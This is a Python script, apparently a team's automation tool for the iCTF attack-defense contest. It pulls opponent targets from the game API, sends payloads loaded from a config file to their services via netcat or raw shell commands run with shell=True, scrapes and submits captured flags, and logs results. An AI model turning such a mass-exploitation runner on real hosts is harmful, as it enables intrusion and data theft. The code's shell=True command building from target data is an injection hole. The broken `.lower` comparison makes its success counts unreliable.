# -*- coding: utf-8 -*-
"""`
__author__:surajshah
"""

from ictf import iCTF
import os, sys
import ConfigParser
import json
import time
import datetime
import subprocess
from ast import literal_eval
config = os.path.join(os.path.dirname(__file__), 'config.txt')

SERVICE_DICT = {"service1":10001,"service2":10002,"service3":10003}
#,"service4":10004,"service5":10005}
VARIABLES = ["<flag-id>","<token-id>","<port>","<team-id>"]
COMMAND = "#!/bin/zsh\necho \'{}\' | nc {} {} -w {}"
COMMAND1 = "#!/bin/zsh\n {}"
service_counter = 0

def getConfig():
	try:
		configParser = ConfigParser.RawConfigParser()   
		configParser.read(config)
		return configParser
	except Exception as e:
		exc_type, exc_obj, exc_tb = sys.exc_info()
		fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
		print(e, exc_type, fname, exc_tb.tb_lineno)


def get_t():
	try:
		configParser = getConfig()
		team_ip = 'http://' + str(configParser.get("login","team-ip")) + '/'
		i = iCTF(team_ip)

		t = i.login(str(configParser.get("login","username")),
			str(configParser.get("login","password")))
		return t
	except Exception as e:
		exc_type, exc_obj, exc_tb = sys.exc_info()
		fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
		print(e, exc_type, fname, exc_tb.tb_lineno)


def get_service_list():
	return get_t().get_service_list()


def exploits():
	global service_counter
	try:
		configParser = getConfig()
		t = get_t()
		services = t.get_service_list()
		timeout = str(configParser.get("submit-parameters","nc-timeout"))

		inverse_dict = {v: k for k, v in SERVICE_DICT.iteritems()}
		#generate command to exploit these services
		for each_service in services:
			service_counter += 1
			command_list = []
			flags_list = []
			try:
				service_id = int(each_service['service_id'])
				#port = each_service['port']
			
				if service_id not in inverse_dict:
					print "serviceid not correct.The following serviceid \
					does not exist: ", service_id
					exit()

				service_payload = str(configParser.get("vulnerability", str(inverse_dict[service_id])))
				targets_list = t.get_targets(service_id)[u'targets']
			
				for target in targets_list:
					try:
						flag_id = str(target['flag_id'])
						port = int(target['port'])
						hostname = str(target['hostname'])
						temp_payload = service_payload

						for n, variable in enumerate(VARIABLES):
							if variable in service_payload:
								temp_payload = temp_payload.replace(variable,"{}")
								if n == 0:
									temp_payload = temp_payload.format(flag_id)
								if n == 1:
									pass
									#service_payload.format(tokenid)
								if n == 2:
									temp_payload = temp_payload.format(port)
								if n == 3:
									temp_payload = temp_payload.format(hostname)

						if service_id == 10003:
							#webservice - use COMMAND1
							#print "Comes here"
							temp_command = COMMAND1.format(temp_payload)
							#print temp_command
						else:
							temp_command = COMMAND.format(temp_payload,hostname,port,timeout)

						#print temp_command
						command_list.append(temp_command)

					except Exception as e:
						exc_type, exc_obj, exc_tb = sys.exc_info()
						fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
						print(e, exc_type, fname, exc_tb.tb_lineno)
						continue
				
				command_list = list(set(command_list))
				# from pprint import PrettyPrinter
				# pp = PrettyPrinter()
				# print "\n\n"
				# pp.pprint(command_list)
				if command_list != []:
					command_dict = {}
					for c in command_list:
						command_dict[c] = []
					for bashCommand in command_list:
						process = subprocess.Popen(bashCommand, stdout=subprocess.PIPE, shell=True)
						output, error = process.communicate()
						# print output
						# print error
						# break
						#if service_id == 10003:
							#print "Comes here2"
							#print output
						#	pass
						if output is not None:
							if "FLG" in str(output):
								value = output.split("FLG")
								for i in value[1:]:
									flg = "FLG"+((i.split("\n")[0]).split()[0]).split(',')[0]
									flags_list.append(flg)
									command_dict[bashCommand].append(flg)

					if flags_list != []:
						submit_flags(flags_list)
					record_logs(1, command_dict)

			except Exception as e:
				print "Error in loop services:", e
				exc_type, exc_obj, exc_tb = sys.exc_info()
				fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
				print(e, exc_type, fname, exc_tb.tb_lineno)
				continue

	except Exception as e:
		exc_type, exc_obj, exc_tb = sys.exc_info()
		fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
		print(e, exc_type, fname, exc_tb.tb_lineno)


def submit_flags(flags_list):
	global service_counter
	try:
		#print len(flags_list)
		flags_list = list(set(flags_list))
		t = get_t()
		logs = t.submit_flag(flags_list)
		flags = {}
		for i, output in enumerate(logs):
			flags[flags_list[i]] = output
		record_logs(2,flags)
	except Exception as e:
		exc_type, exc_obj, exc_tb = sys.exc_info()
		fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
		print(e, exc_type, fname, exc_tb.tb_lineno)


def record_logs(indicator, value):
	"""
	records timestamp, successful flags, unsuccessful flags, command:[flag1,flag2]
	"""
	global service_counter
	try:
		t = time.time()
		ts = datetime.datetime.fromtimestamp(t).strftime('%Y-%m-%d %H:%M:%S')
		if indicator == 1 and value != {}:
			with open("../logs1.txt","a+") as f:
				f.write("\n\n\nService{}\n{}\t\t".format(service_counter, ts)+"\n"+str([x for x in value.values()]))	

		if indicator == 2 and value != {}:
			with open("../logs2.txt","a+") as f:	
				successfully_submitted = 0
				unsuccessfully_submitted = 0
				for x in value.values():
					if str(x).lower == "correct":
						successfully_submitted += 1
					elif str(x).lower == "incorrect":
						unsuccessfully_submitted += 1
					else:
						pass
						#print "Return value of flag submission other than correct or incorrect", x
				#unsuccessfully_submitted = sum(1 for "incorrect" in value.values())
				#successfully_submitted = len(value.keys()) - unsuccessfully_submitted
				print "Count of S: {}, U: {} for service{}".format(successfully_submitted, unsuccessfully_submitted, service_counter)
				f.write("\n\nService{}\n{}, \t {},\t {}".format(service_counter, ts, successfully_submitted, unsuccessfully_submitted))
	except Exception as e:
		exc_type, exc_obj, exc_tb = sys.exc_info()
		fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
		print(e, exc_type, fname, exc_tb.tb_lineno)


if __name__ == '__main__':
	exploits()
